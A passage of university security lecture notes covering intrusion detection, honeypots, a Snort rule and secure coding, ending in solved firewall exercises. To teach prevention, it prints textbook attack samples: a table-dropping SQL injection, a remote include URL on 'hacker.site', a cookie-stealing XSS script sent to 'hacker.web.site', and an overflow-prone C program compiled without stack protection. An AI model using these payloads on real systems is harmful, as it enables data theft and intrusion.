| Adaptability     | A new signature per new attack         | The model evolves with the behaviour       |

### 2.8 Host-based IDS (HIDS)

**Definition (slide 543):** a specialised layer of security software on vulnerable or
sensitive systems, such as database servers and administrative systems. It monitors activity
inside the system. Purposes: detect intrusions, log suspicious events, send alerts. It uses
both analysis approaches.

**Four data sources for the sensors (slides 544 and 545):**

1. **System call traces:** a record of the sequence of system calls made by the processes.
   Widely recognised as the preferred source for HIDS. Advantage: works well on Unix and
   Linux. Disadvantage: problematic on Windows, where the extensive use of DLLs obscures
   which process makes which call.
2. **Audit records:** most modern OSs include accounting software that collects user
   activity. Advantage: no extra collection software. Disadvantages: the records may lack
   the needed information or a convenient format; intruders may manipulate the logs to hide
   their actions.
3. **File integrity checksums:** periodic scan of critical files (system files), comparing
   current hashes with a baseline of known values. Disadvantages: the good checksums must be
   generated and protected; files that legitimately change all the time are hard to monitor.
4. **Registry access:** used on Windows, given the amount of information and access programs
   make to the Registry. Disadvantage: very Windows specific, limited success.

Sensor function: collect data, filter it into a standard format, forward it to the analyser.

**Anomaly HIDS on Linux and UNIX (slides 546 and 547):** most work was done there because
data is easy to collect. Preferred source: system call traces, because system calls are how
programs reach kernel functions, and they give detailed information on process activity.
Decision engines: the original approach **STIDE** compares observed call sequences with
normal sequences from training to obtain a **mismatch ratio**. Alternatives from machine
learning: Hidden Markov Models (HMM), artificial neural networks (ANN), support vector
machines (SVM), extreme learning machines (ELM). Performance is measured by detection rate,
false positives and detection speed.

**Signature HIDS (slide 548):** the basis of **antivirus** software, on client PCs, mobile
devices, and embedded in e-mail and web proxies and in NIDS. Two techniques: **signatures**
(a database of file patterns found in known malware) and **heuristics** (rules that
characterise known malicious behaviour). Very efficient against known malware. Cannot detect
zero-day attacks, because the new attack matches no signature or rule. Widely used on
Windows, still a main target of intruders.

**Distributed HIDS (slide 549):** traditional HIDS work stood alone on one system. An
organisation defends a distributed collection of hosts, so a more effective defence comes
from coordination and cooperation between the IDSs over the network.

### 2.9 Network-based IDS (NIDS)

**Definition (slide 550):** monitors traffic at selected points of a network, packet by
packet, in real time or close to it. It analyses activity at the network (L3), transport
(L4) and application (L7) protocols. **Contrast:** the NIDS examines packet traffic directed
at the systems; the HIDS examines user and software activity inside a host. The NIDS is
typically part of the perimeter infrastructure, built into or beside the firewall, focused on
external intrusion attempts. Typical architecture: sensors (monitor traffic), management
servers (analysis), management consoles (human interface).

**The big limitation: encryption (slide 552).** With growing use of TLS/SSL, NIDS lost
access to meaningful payload. They cannot see malicious commands inside an HTTPS session.
NIDS remain important but can only be part of the solution (defence in depth).

**Two sensor modes:**

1. **Inline sensor:** inserted in a network segment, so the traffic must pass through it.
   It can be combined with a firewall or a switch. Advantage: it can **block** an attack
   when detected, acting as IDS and IPS.
2. **Passive sensor:** the most common. It monitors a **copy** of the traffic; the real
   traffic does not pass through the device. Advantage: more efficient, no extra handling
   step, no added packet delay.

**Passive configuration (slide 553):** the sensor connects to the medium (fibre optic cable)
through a **tap**, which gives it a copy of all traffic. **NIC 1 (collection)** is connected
to the tap, usually has no IP address, and collects everything in promiscuous mode.
**NIC 2 (management)** has an IP address and talks to the NIDS management server.

**Wireless sensors:** inline (built into an access point) or passive (monitoring the air).
Only wireless sensors can analyse wireless protocol traffic and detect specific attacks
(wireless DoS, session hijacking, rogue AP). A **WIDS** is a NIDS focused only on wireless
networks.

**The Snort pipeline (figure, slide 551):**

```
Network traffic -> Packet decoder -> Preprocessor -> Detection engine (rules)
-> Logging and alerting system -> Output modules -> Output: alert or log
```

### 2.10 Honeypots

**Definition (slide 554):** decoy systems designed to lure a potential attacker away from
critical systems. **Three objectives:**

1. **Divert** the attacker from critical systems.
2. **Collect information** about the attacker's activity, techniques and tools.
3. **Gain time:** encourage the attacker to stay long enough for the administrators to respond.

**The logic:** the honeypot is filled with fabricated information that looks valuable but a
legitimate user would never access. Any access is, by definition, suspicious. The system is
instrumented with sensitive monitors and loggers. Because the attack appears to succeed, the
administrators can track the attacker without exposing production systems.

**Value (slide 555):** a resource with no production value. Any inbound communication is
probably a probe, scan or attack. If a honeypot starts **outbound** communication, it was
probably compromised.

- **Low interaction honeypot:** a software package that **emulates** services or systems
  (it pretends to be an FTP server). It gives a realistic initial interaction but does not
  run the full services. Advantage (slide 556): enough to detect the early stages of an
  attack (scan, probe) and alert, as a component of a distributed IDS.
- **High interaction honeypot:** a real system, with a full OS and real services and
  applications, instrumented and placed where attackers can reach it. Advantages: a much
  more realistic target; it can hold an attacker for a long time. Disadvantages: far more
  resources; and if compromised, it can be used to attack other systems on the Internet,
  with legal or reputation problems for the organisation.

**Honeynet:** the Honeynet Project builds whole networks of honeypots that emulate a company,
with simulated traffic.

**Three deployment positions (slides 557 to 560):**

1. **External, on the Internet before the external firewall (slide 558).** Advantages:
   tracks connection attempts to unused IPs (scans); no added risk to the internal network,
   because the danger of a compromised system behind the firewall is avoided; reduces
   noise, since it attracts many attacks and so fewer alerts reach the firewall and the
   internal IDS sensors. Disadvantage: little or no capacity to capture internal attackers.
2. **DMZ, between the two firewalls (slide 559).** Advantage: monitors attacks on the public
   services (web, mail, DNS). Disadvantages: contamination risk, the other DMZ systems must
   be secured against the honeypot; conflict with the external firewall, which blocks
   unneeded traffic to the DMZ (only ports 80 and 443), so the administrator must either
   open the firewall and raise the risk, or limit the honeypot, which then misses the
   blocked attacks.
3. **Internal, on the corporate network after the firewall (slide 560).** Advantages: the
   most important one, it captures **internal attacks**; it detects a misconfigured firewall
   that forwards Internet traffic inside. Disadvantages: high risk, a compromised honeypot
   attacks other internal systems; the firewall does not block the attacker's traffic to the
   honeypot, since it is "permitted" traffic; the internal firewall needs exception rules.

**Honeyfiles (slide 560):** emulate legitimate documents with realistic names, such as
"Salarios Diretoria.xlsx", as bait. Any access is suspicious, because legitimate users
should not open them.

### 2.11 The Snort rule

The rule on slide 561 and in list 9:

```
alert tcp $HOME_NET any -> $EXTERNAL_NET ![7680,1521]
(msg:"ET P2P BitTorrent peer sync";
 flow:established,to_server;
 content:"|00 00 00 0d 06 00|"; depth:6;
 threshold: type limit, track by_dst, seconds 300, count 1;
 reference:url,bitconjurer.org/BitTorrent/protocol.html;
 classtype:policy-violation; sid:2000334; rev:14;
 metadata:created_at 2010_07_30, confidence Medium,
 signature_severity Informational, updated_at 2025_06_30;)
```

**Header (slide 562):**

| Part                         | Meaning                                                       |
| ---------------------------- | ------------------------------------------------------------- |
| `alert`                      | The action: generate an alert when the condition is met       |
| `tcp`                        | The protocol: only TCP traffic                                |
| `$HOME_NET any`              | Source: the internal network, any port                        |
| `->`                         | Direction: from source to destination                         |
| `$EXTERNAL_NET ![7680,1521]` | Destination: the external network, except ports 7680 and 1521 |

**Options (slides 563 and 564):**

| Option                              | Function                                                        |
| ----------------------------------- | --------------------------------------------------------------- |
| `msg:"ET P2P BitTorrent peer sync"` | The message shown in the logs                                   |
| `flow:established,to_server`        | Only established TCP connections, towards the server            |
| `content:"\|00 00 00 0d 06 00\|"`   | Search for the byte sequence 00 00 00 0d 06 00                  |
| `depth:6`                           | Search only the first 6 bytes of the payload                    |
| `threshold: type limit, ...`        | `track by_dst, seconds 300, count 1`: 1 alert per dst per 300 s |
| `reference:url,...`                 | Link to the BitTorrent protocol documentation                   |
| `classtype:policy-violation`        | Category: policy violation                                      |
| `sid:2000334`                       | Unique identifier of the rule                                   |
| `rev:14`                            | Revision number 14                                              |
| `metadata`                          | Created 2010_07_30, updated 2025_06_30, confidence Medium       |

External material:

- NIST CSRC, article: [SP 800-61 Rev. 3, Incident Response Recommendations and Considerations for Cybersecurity Risk Management](https://csrc.nist.gov/pubs/sp/800/61/r3/final)
  The incident response guide the slides cite for the examples of intrusion.
- The Honeynet Project, site: [honeynet.org](https://www.honeynet.org/)
  The project named on slide 556.
- Snort, documentation: [Snort 3 rule writing](https://docs.snort.org/rules/)
  The reference for rule headers and options such as `flow`, `content`, `depth` and `threshold`.

---

## PART 3: Software vulnerabilities (Lecture 16)

### 3.1 The root of the problem

Many security vulnerabilities result from **bad programming practices** (slide 566).
Awareness of these flaws is the first step to safer code. The **OWASP Top 10** of web
application risks includes **five** flaws directly related to insecure code:

1. Unvalidated input.
2. Cross-site scripting (XSS).
3. Buffer overflow.
4. Injection flaws.
5. Improper error handling.

**CWE/SANS Top 25 Most Dangerous Software Errors (slides 567 to 570):** the consensus on
the practices that cause most cyberattacks, in **three categories**.

1. **Insecure interaction between components (slide 568):** SQL injection (improper
   neutralisation of special elements in an SQL command); OS command injection; cross-site
   scripting (improper neutralisation of input during web page generation); unrestricted
   upload of a file with a dangerous type; cross-site request forgery (CSRF); URL redirect
   to an untrusted site (open redirect).
2. **Risky resource management (slide 569):** buffer copy without checking the input size
   (buffer overflow); improper limitation of a path name to a restricted directory (path
   traversal); download of code without an integrity check; inclusion of functionality from
   an untrusted control sphere; use of a potentially dangerous function; incorrect
   calculation of the buffer size; uncontrolled format string; integer overflow or
   wraparound.
3. **Porous defences (slide 570):** missing authentication for a critical function; missing
   authorisation; hard-coded credentials; missing encryption of sensitive data; reliance on
   untrusted inputs in a security decision; execution with unnecessary privileges; incorrect
   authorisation; incorrect permission assignment for a critical resource; use of a broken or
   risky cryptographic algorithm; improper restriction of excessive authentication attempts;
   one-way hash without a salt.

### 3.2 Software failure versus software security

**Program failures (slide 571)** result from unanticipated input, system interaction, or
incorrect code. They are expected to follow some probability distribution. The usual quality
approach uses structured design and testing to remove as many bugs as reasonably possible.
Testing covers likely input variations and common errors. The main concern is not the total
number of bugs, but how often they are triggered.

**Software security differs (slide 572):** the **attacker chooses the probability
distribution**, aiming at specific bugs whose failure is exploitable. Those bugs are triggered
by inputs that differ drastically from the expected, so common testing is unlikely to find
them. Secure code needs attention to every aspect of how the program runs, its environment
and its data. Nothing can be assumed, and every potential error must be checked.

**Defensive (or secure) programming (slide 573):** the process of designing and implementing
software so that it keeps working even under attack. The software detects erroneous
conditions caused by an attack and either continues safely or **fails gracefully**.
**The key rule:** never assume anything, verify every assumption, handle every possible
error state.

**The abstract model (slide 574):** a program reads input from several sources, processes it
by an algorithm, and produces output to several destinations. It runs in the environment of
an OS, with the machine instructions of a processor, using system calls and possibly other
programs. Execution may save or change data on the system or cause other side effects. All of
this interacts, often in complex ways. The definition demands that assumptions about execution
and input types are made explicit.

**Business pressure (slide 575):** programmers focus on the steps to success and the normal
flow, not on every point of failure. Handling errors correctly increases code and development
time, which conflicts with short schedules and market advantage. Unless security is a design
goal from the start, a secure program is unlikely.

**Maintenance (slide 576):** on changes, verify assumptions, handle all errors, check the
interactions with existing code. Failing this can introduce vulnerabilities into a program
that was secure.

**The defensive mindset (slide 577):** a different mentality from "most users, most of the
time". **"Paranoia is a virtue":** the growth of vulnerability reports proves the threat.
Normal tests do not find vulnerabilities triggered by highly unusual input. Programs must be
as resilient as possible to any error or unexpected condition.

**Maturity (slides 578 and 579):** other engineering disciplines treat safety and reliability
as design goals, and society does not tolerate collapsing bridges, buildings or aircraft.
Software has not reached that maturity; society tolerates much higher failure levels.
Standards: **ISO 12207** (software life cycle processes), SEI06. **SAFECode** (Software
Assurance Forum for Excellence in Code), formed by large IT companies, publishes best practices
for software assurance and secure development. **Threat modelling** (risk analysis) should be
part of the design process (slide 580).

**Four critical areas of interaction (slide 581):**

1. Secure input handling (the critical initial issue).
2. Algorithm implementation.
3. Interaction with other components.
4. Program output.

Many vulnerabilities come from a small set of common errors.

### 3.3 Input handling and buffer overflow

**Input (slide 582):** any data source outside the program whose value the programmer does
not know when writing the code. Obvious sources: keyboard, mouse, files, network connections.
Indirect sources: the execution environment, configuration files, values supplied by the OS.

**Requirements (slide 583):** identify all input sources, state the assumptions about size
and type, verify them explicitly in code, and use the values consistently with them.
**Two concerns:** the **size** of the input, and its **meaning and interpretation**.

**Size and buffer overflow (slides 584 and 585):** programmers assume a maximum expected
size (a few lines of text) and allocate fixed buffers (512 or 1024 bytes) without checking
that the real input fits. If the input exceeds the buffer, the **overflow** can compromise
execution. Common tests use expected inputs and do not find it. Library routines may not
limit the data copied into the buffer, which aggravates it. Secure practice: safe string and
buffer copy routines, and programmer awareness.

**Secure coding mindset (slides 586 and 587):** treat any input as dangerous. Use dynamically
sized buffers, or process the input in blocks of the buffer size. Even with dynamic buffers,
check that the requested space does not exceed available memory. On a size or memory error,
fail gracefully: process in blocks, discard the excess, or terminate. Apply these checks
wherever data of unknown value enters or is handled, for every input source.

**The lecture example, a stack buffer overflow (slides 588 and 589):**

```c
#include <stdio.h>
#include <string.h>

char *my_gets(char *s) {
    int c;
    char *p = s;
    while ((c = getchar()) != '\n' && c != EOF) {
        *p++ = c;                    /* no length check */
    }
    *p = '\0';
    return s;
}

void consulta_nome(char *s) {        /* pretend it comes from the database */
    strcpy(s, "Gabriel");
}

int main() {
    char var_outrasInfos[10];
    char var_nome[10];
    consulta_nome(var_nome);
    my_gets(var_outrasInfos);
    printf("Dados: Nome: %s \nOutras Informacoes: %s \n", var_nome, var_outrasInfos);
    printf("==Fim do Programa==\n");
    return 0;
}
```

```bash
gcc -o buffer_overlflow buffer_overlflow.c
./buffer_overlflow
```

1. Type something short ("Teste"): the program works.
2. Type more than 10 characters ("1234567890AAAAA"): `var_nome` ("Gabriel") is overwritten
   by the excess characters, because both buffers are 10 bytes on the stack and `my_gets`
   never checks the length.
3. With a long input the program prints the corrupted name and then
   `*** stack smashing detected ***: terminated`, and the shell reports SIGABRT.
   That message means GCC inserted a protection that detected the stack corruption when the
   function tried to return (slide 591).
4. To reproduce the classic attack, compile with `-fno-stack-protector` (slide 592), run
   again, and look up the signal in `man 7 signal`.

```bash
gcc -fno-stack-protector -o buffer_overlflow buffer_overflow.c
./buffer_overlflow
```

### 3.4 Interpretation of input

**Binary versus text (slide 593):** the meaning of the input is as critical as its size.
For binary data, the program assumes that raw values represent integers, floats, strings or
structures, and that assumption must be validated as values are read. Examples: Ethernet
frames, IP packets, TCP segments; DNS, SNMP, NFS. They require validation against the
abstract syntax specification.

**Heartbleed (slide 594):** the OpenSSL bug of **2014**. A failure to check the validity of
a binary input value: the code did not check the amount of data requested for return against
the amount supplied. Classified as a **buffer over-read**. Attackers read adjacent memory and
leaked user names, passwords, private keys and other sensitive data.

**Text and character sets (slides 595 and 596):** raw bytes are interpreted as characters
according to a character set, traditionally ASCII, with different extensions for accented
characters on Windows and macOS, and growing internationalisation today. The program must
identify which set is in use. Beyond the characters, the meaning must be identified (integer,
float, file name, URL, e-mail) and the type confirmed. Failure lets an attacker influence the
program's operation.

**Injection attacks (slides 597 and 599):** exploit the failure to validate the
interpretation of input. Input data influences, accidentally or deliberately, the flow of
execution. Common mechanism: input is passed as a parameter to an auxiliary program whose
output the original program uses. Frequent in scripting languages (Perl, PHP, Python, sh)
that reuse system utilities, and in web CGI scripts that process HTML form data.
Defences: input validation, and correct handling of internationalised input.

**Insecure deserialisation (slide 598):** serialisation converts objects to a byte stream and
rebuilds them later, a complex form of binary input interpretation. The vulnerability: the
application accepts serialised objects from untrusted sources and assumes the stream is a
valid, safe object. The attacker manipulates the bytes, and during reconstruction the system
runs the attacker's logic, often **remote code execution (RCE)**.

**SQL injection (slide 600):** user input builds an SQL request. Vulnerable PHP:

```php
$name = $_REQUEST['name'];
$query = "SELECT * FROM suppliers WHERE name = '" . $name . "';";
$result = mysql_query($query);
```

Input `Bob` works as intended. Input `Bob'; drop table suppliers` retrieves the record and
deletes the whole table. Similar to command injection, but with SQL metacharacters.
**Prevention:** validate the input before use (escape metacharacters or reject), use the
language's sanitising functions, use **placeholders or SQL parameters** instead of
concatenation, combine with stored procedures.

**Code injection (slides 601 and 602):** the input includes code that the attacked system
later runs. PHP scenario: variables build file names in include scripts.

```php
include $path . 'functions.php';
include $path . 'data/prefs.php';
```

The script is called directly, bypassing the original intent, using two PHP features: global
variables assigned from the HTTP request, and `include` accepting remote URLs.

```
GET /calendar/embed/day.php?path=http://hacker.site/hack.txt?&cmd=ls
```

`$path` receives the attacker's URL and the remote file runs with the privileges of the web
server. **Defences:** block the automatic assignment of form fields to global variables (save
them in an array and fetch by name, the default in newer PHP; it may break legacy code); use
only constant values in `include` and `require`, or validate a variable rigorously right
before use. Other variants: e-mail injection, format string, interpreter injection.
The critical need: identify all input sources, validate assumptions before use, understand
how every function or service interprets the values passed to it.

**Cross-site scripting, XSS (slides 603 and 604):** code injected into a guest book sends the
victim's cookie to the attacker, allowing impersonation:

```html
Thanks for this information, its great!
<script>document.location='http://hacker.web.site/cookie.cgi?'+document.cookie</script>
```

**Obfuscation:** the attacker writes the script with HTML character entities
(`&#60;&#115;&#99;...` for `<sc...`). The browser interprets it identically.
**Prevention:** examine user input, remove or escape dangerous code, and make the validators
translate HTML entities before checking. **Nature of the flaw:** a failure in handling both
input and output. The real target is the **next user**, not the server. Output sanitisation
stops the attack. Similar problems: CSRF and HTTP response splitting (careless use of
untrusted input).

**Syntax validation (slide 605):** ensure the data conforms to the assumptions (printable
characters, e-mail format, integers) before use.

| Strategy                          | Method                                        | Verdict                   |
| --------------------------------- | --------------------------------------------- | ------------------------- |
| **Whitelisting** (_lista branca_) | Compare with what is wanted, accept the valid | Recommended               |
| **Blacklisting** (_lista negra_)  | Compare with known dangerous values           | Fails on each new evasion |

Often implemented with regular expressions. On failure: reject the input, or sanitise it by
escaping metacharacters.

**Canonicalisation (slide 606):** characters have multiple encodings (HTML, Unicode/UTF-8).
The character `/` has several UTF-8 representations beyond the standard `2F`. Attackers use
long or redundant encodings to bypass filters (a Microsoft IIS flaw in the 1990s).
**Solution:** transform the input into a unique, standard, minimal representation
**before validation**. Use anti-XSS libraries or web frameworks that automate it.

**Numeric values (slide 607):** fixed sizes (8, 16, 32, 64 bits), signed or unsigned.
A **casting** vulnerability occurs when a value is converted incorrectly between types: a
buffer size read as unsigned and then compared as signed. A very large value, with the top
bit set, is read as negative, passes the maximum size check, and overflows when used for
allocation or copying.

**Fuzzing (slide 608):** a testing technique by **Barton Miller (1989)** that uses randomly
generated data as input, to see whether the program handles abnormal input or crashes.
Advantages: simple, cheap, independent of assumptions about expected input, finds serious
and exploitable flaws. Limitation: may miss bugs that need very specific input conditions.
Essential for developers (prevention) and attackers (vulnerability discovery).

### 3.5 Algorithms, memory and concurrency

**Algorithm implementation (slide 609):** design or implementation flaws create exploitable
bugs. Examples: the predictable random number generator in old **Netscape**, which allowed
breaking its cryptography; **TCP session hijacking** through predictable initial sequence
numbers. The machine code must faithfully represent the high level algorithm: **Ken Thompson
(1984)** showed a malicious compiler inserting invisible backdoors. **Debug code** left in
production can allow improper access: the **Morris Worm** exploited the DEBUG command in
sendmail.

**Data interpretation and memory (slide 610):** how bits are read (integer, char, pointer)
depends on the machine instructions. Weakly typed languages such as C allow direct memory and
pointer manipulation, which makes buffer overflows and data structure corruption easy.
Defence: strongly typed languages, or rigorous validation of casts. Failing to free dynamic
memory causes **memory leaks**, resource exhaustion and DoS. Languages with automatic memory
management (Java, C++ in the slide's wording) are preferable to manual C.

**Concurrency (slide 611):** **race conditions** occur when several processes or threads
compete for uncontrolled access to shared resources (memory); without synchronisation, values
are corrupted or changes lost. Incorrect use of synchronisation primitives causes
**deadlock** (circular wait), which attackers can trigger deliberately for DoS. Mitigation:
correct choice of primitives, and design that limits the shared areas.

### 3.6 Interaction with the operating system

**The environment (slide 612):** the OS mediates access to resources and builds the process
environment: code, data, command line arguments and environment variables. All of it must be
treated as external input and validated. Resources have user and group permissions; programs
need appropriate access, and excessive access is dangerous.

**Environment variables (slide 613):** strings inherited from the parent process (PATH, IFS,
LD_LIBRARY_PATH). They are an entry point for untrusted data.

- **PATH attack:** the attacker changes PATH so that a privileged script runs a malicious
  program (a fake `grep`) instead of the system utility.
- **LD_LIBRARY_PATH attack:** loading malicious dynamic libraries into privileged programs.
- **Mitigation:** avoid privileged shell scripts (hard to secure); use compiled wrapper
  programs that clean the environment before calling scripts; reset critical variables to
  known safe values at the start.

**Least privilege (slide 614):** programs run with the minimum privileges needed. If a
privileged program (root) is compromised, the attacker gains full control. Practices: prefer
group privileges over user privileges (easier to audit); privileged programs such as web
servers should not own all their files, only read where needed; servers should not run as
root all the time: use root only to bind low ports, then drop privileges.

**Modularisation and isolation (slide 615):** partition large programs into smaller modules
and grant elevated privileges only to the modules that need them, briefly (the Postfix mail
server). **Sandboxing and chroot:** run vulnerable programs in isolated environments.
A **chroot jail** limits the program's view of the file system to one directory. Limitation:
hard to configure; done wrong, the program escapes or fails.

**System calls and assumptions (slide 616):** the OS and libraries buffer and reorder for
performance, which can conflict with security. Case: **secure file deletion (shredding)**.
Overwriting a file does not guarantee the old data is gone: I/O library buffers, file system
buffers and smart disk controllers (which avoid rewriting the same block, especially on SSDs
and flash) all intervene. The secure programmer must understand and control these layers,
for example force flush and sync.

### 3.7 Program output

**Nature of output (slide 617):** binary (network protocols, graphics structures) or textual
(HTML, character sets). It must conform strictly to the format and interpretation expected by
the device or user. **The common origin problem:** users assume the output was generated and
validated by the trusted program. That fails when the program accepts input from one user and
shows it to another (comments, forums) without sanitisation.

**Attacks through output (slide 618):**

- **Terminal attacks (legacy, VT100):** escape sequences in malicious text could reprogram
  function keys to run arbitrary commands (delete files) when the victim viewed the text.
- **XSS:** exploits the browser's trust in the originating site. Unsanitised third party data
  runs scripts (JavaScript) in the victim's browser.

**Mitigation (slide 619):** programs that relay third party data are responsible for its
safety. Prefer **whitelisting** known safe content over removing the dangerous. Different
character sets change the interpretation of metacharacters, so the encoding must be specified
explicitly (the `Content-Type` header), or the browser assumes an insecure default.
The attack targets the user or the display device, not the server, but it damages the
software's reputation.

External material:

- OWASP, article: [OWASP Top Ten](https://owasp.org/www-project-top-ten/)
  The current list of web application risks that slide 566 refers to.
- MITRE, article: [CWE Top 25 Most Dangerous Software Weaknesses](https://cwe.mitre.org/top25/)
  The list behind the three categories of slides 567 to 570.
- Codenomicon, site: [The Heartbleed Bug](https://heartbleed.com/)
  The original disclosure page for the 2014 OpenSSL over-read.

---

## 4. Exercise list 8, solved (firewalls)

### Section 1: security concepts and defence strategy

**1. Define the network perimeter. What is the fundamental role of the firewall between the
trusted and untrusted networks?**

The **perimeter** is the boundary between the internal, protected network (the premises
network, trusted) and the external network (the Internet, untrusted), slides 455 and 462.
The firewall sits on that boundary and establishes a **controlled link**: all traffic in both
directions passes through it (the choke point), only traffic authorised by the local security
policy passes, and the firewall itself is immune to penetration (the three goals of
[BELL94], slide 456). It protects the trusted side from Internet based attacks while still
allowing the organisation to reach the outside world (the dilemma, slide 450).

**2. The difference between the security policy (strategic level) and the firewall rules
(technical level). Who dictates whom?**

The **security policy** states, at the level of the organisation, which traffic types the
organisation needs to support and which risks it accepts. It comes from the **risk
assessment** and the information security policy (slide 457). The **access policy** of the
firewall is derived from it: a broad specification, refined into specific filter elements,
and implemented in the firewall topology. The **rules** are the technical implementation of
those filter elements: addresses, ports, protocols, actions. The policy dictates the rules.
A rule with no policy behind it is a misconfiguration waiting to happen (weakness 5 of
NIST SP 800-41, slide 475).

**3. What is the attack surface? How does a positive filter reduce it?**

The slides do not define the term. Beyond the slides: the attack surface is the set of points
(services, ports, interfaces, inputs) through which an attacker can try to enter or extract
data. A **positive filter** passes only packets that meet specific criteria and ends with a
**deny** (slide 464). Every service not explicitly authorised is closed, so the ports and
services reachable from outside shrink to the list in the policy. That is capability 1 of the
firewall: it prohibits vulnerable services from entering or leaving (slide 460). A negative
filter, with an allow at the end, leaves every service open that nobody thought to block.

**4. Defence in depth: with a robust border firewall, why still secure the hosts? Cite a
threat the border firewall does not stop.**

Because of the four limitations of slide 461. The firewall does not stop attacks that
**bypass** it (an internal system with its own ISP link, a direct link to a partner), does not
fully stop **internal threats** (a disgruntled employee, an employee tricked by phishing),
cannot stop **insecure wireless** reached from outside, and cannot stop an **infected
portable device (BYOD)** brought in from outside. Also, traffic encrypted by a VPN that
terminates behind the firewall is invisible to it (slide 506). Any one of these threats lands
inside the perimeter, where only host defences remain: antivirus (signature HIDS, slide 548),
patches, host firewalls (slide 493). Defence in depth means that the failure of one layer does
not expose everything (slide 455). Example threat: an employee's laptop infected at home and
connected to the LAN.

### Section 2: packet filters

**1. How a stateless packet filter works. What information does it use?**

It applies a list of rules to each IP packet, inbound and outbound, and forwards or discards
it (slide 465). The rules compare the IP and TCP or UDP headers, top to bottom; the first
match decides, and with no match the default action applies (slide 466). Information used,
layers 3 and 4 only: source IP address, destination IP address, source and destination port,
the IP protocol field (TCP, UDP, ICMP), and the interface. It keeps no memory between packets.

**2. One advantage and one limitation of the stateless filter.**

Advantage (slide 473): **speed**, because it does not inspect the payload; also simplicity and
transparency to users. Limitation (slides 474 and 475): it does not examine upper layer data,
so it cannot block attacks on application vulnerabilities or specific application commands.
Other limitations: limited logging, no advanced user authentication, vulnerable to IP
spoofing and tiny fragments, easy to misconfigure.

**3. The return traffic problem and how the stateful filter solves it.**

A server uses a well-known port below 1024, a client a temporary port above 1024, for example
49152 (slide 478). To let the reply from port 25 reach port 49152, a stateless filter must
permit inbound traffic to **all** high ports (rule 4 of Table 9.1), which lets an attacker
reach any internal service above 1023, such as a proxy on 8080 (slide 469). The stateful
filter keeps a **state table** of the active outbound TCP connections, and permits inbound
traffic to a high port **only** if the packet matches an entry (slide 479). The reply to a
connection the inside opened is accepted; an unsolicited packet to a high port is not.

**4. Define the stateful packet filter.**

A firewall that reviews the same L3 and L4 header information as a packet filter **and**
records the state of each TCP connection (established, closing), in a directory of active
connections (slide 480). It tightens the rules for TCP traffic by tying inbound packets to
connections that exist. Some products also track TCP sequence numbers against session
hijacking, and do limited application inspection for protocols such as FTP, IM and SIPS.

**5. What is the state table and what is its function for an inbound packet?**

The state table (Table 9.2, slide 481) holds one entry per established connection: source
address, source port, destination address, destination port, connection state. For an inbound
packet to a high port, the firewall looks for an entry with the matching addresses and ports.
A match means the packet belongs to a connection that the inside opened, and it is accepted.
No match means the packet is unsolicited, and the rule list or the default policy decides,
normally discard.

**6. A block rule is added to a stateful firewall and the state table is not modified.
What happens to a communication already in progress? Justify.**

The communication **continues** until it closes or its entry times out. Justification from
slide 479: the stateful firewall accepts a packet that fits an existing entry of the state
table. The entry was created when the connection was established, before the new rule, so the
packets of that connection keep matching it. The new rule only affects **new** connections,
whose first packet goes through the rule list and is blocked, so no entry is ever created.
Beyond the slides: this is how common implementations behave (netfilter with an
"accept ESTABLISHED" rule before the block rules). To stop the running connection, the
administrator must also clear the entry from the state table.

### Section 3: application firewalls (proxies)

**1. In which layer of the TCP/IP stack does the application proxy operate?**

In the **application layer**, the top of the stack. It relays application level traffic such
as Telnet, FTP, SMTP and HTTP (slide 482), and the policy it enforces is based on the
application protocol (slide 458).

**2. Compare application firewalls with stateless and stateful packet filters.**

See the table of section 1.10. The packet filter examines L3 and L4 headers of each packet,
with no state and no payload: fast, simple, transparent, but blind to application attacks,
poor at logging, vulnerable to spoofing and misconfiguration. The stateful filter adds the
connection state and solves the high port problem, with limited payload inspection. The
application proxy splices two connections and sees the whole application dialogue: granular
control of commands, full application level logging, more secure because it analyses a few
permitted applications instead of countless header combinations (slide 483). Its cost is
processing overhead on both connections, and it needs proxy code for each supported
application. The hybrid of slide 484 uses a proxy inbound and a cheaper circuit-level gateway
outbound.

**3. What can the application firewall inspect that the packet filters cannot? Example.**

The **payload** and the application commands and content. Weakness 1 of the packet filter
(slide 474): if the application is allowed, all of its functions are allowed. The proxy can
support only specific features: permit HTTP **GET** and deny **POST** (slide 483), check SMTP
mail for spam, or allow HTTP requests only to authorised sites (slide 458). It can also
authenticate the user before relaying (slide 482), which the packet filter cannot do.

**4. How does this position let the application firewall protect against attacks on server
software vulnerabilities?**

There is no end-to-end connection: the client talks to the proxy, and the proxy itself opens
the connection to the server (slide 482). An exploit therefore reaches the **proxy's parser**
first, not the server. The proxy implements only a **subset** of the application commands
(slide 490) and only the features the administrator accepts, so malformed or unsupported
requests are not relayed. The proxy is a very small program, under 1,000 lines against 20,000
for a mail application, so it is easier to audit (slide 491), runs without privileges, with no
disk access, on a hardened bastion host (slide 492). A vulnerability in the server software is
reachable only through requests the proxy chose to forward.

### Section 4: filtering logic and policy implementation

**1. Define the positive filter.**

A filter that allows only the packets that meet specific criteria and rejects everything
else: it has an implicit **deny** at the end (slide 464). It implements the **default
discard** policy: "what is not expressly permitted is prohibited" (slide 466).

**2. Define the negative filter.**

A filter that rejects any packet that meets certain criteria and allows everything else: it
has an implicit **allow** at the end (slide 464). It implements the **default forward**
policy: "what is not expressly prohibited is permitted" (slide 466).

**3. Positive filter for the web server 172.16.20.5.**

| Rule | Src IP     | Src port | Dst IP      | Dst port | Action              |
| ---- | ---------- | -------- | ----------- | -------- | ------------------- |
| 1    | Any        | > 1023   | 172.16.20.5 | 80       | Permit              |
| 2    | Any        | > 1023   | 172.16.20.5 | 443      | Permit              |
| 3    | 10.0.0.100 | > 1023   | 172.16.20.5 | 22       | Permit              |
| 4    | Any        | Any      | Any         | Any      | **Deny** (implicit) |

The implicit rule at the end is **deny all**. FTP (21) and "others" need no rule: they fall
into the final deny. On a stateless filter the replies also need rules, with the ACK flag
(slide 471): source 172.16.20.5 port 80, 443 or 22 to destination any, port > 1023, ACK set,
permit. On a stateful filter the state table handles the replies.

**4. Negative filter for the same server.**

| Rule | Src IP     | Src port | Dst IP      | Dst port     | Action               |
| ---- | ---------- | -------- | ----------- | ------------ | -------------------- |
| 1    | 10.0.0.100 | Any      | 172.16.20.5 | 22           | Permit               |
| 2    | Any        | Any      | 172.16.20.5 | 22           | Deny                 |
| 3    | Any        | Any      | 172.16.20.5 | 21           | Deny                 |
| 4    | Any        | Any      | 172.16.20.5 | 1 to 79      | Deny                 |
| 5    | Any        | Any      | 172.16.20.5 | 81 to 442    | Deny                 |
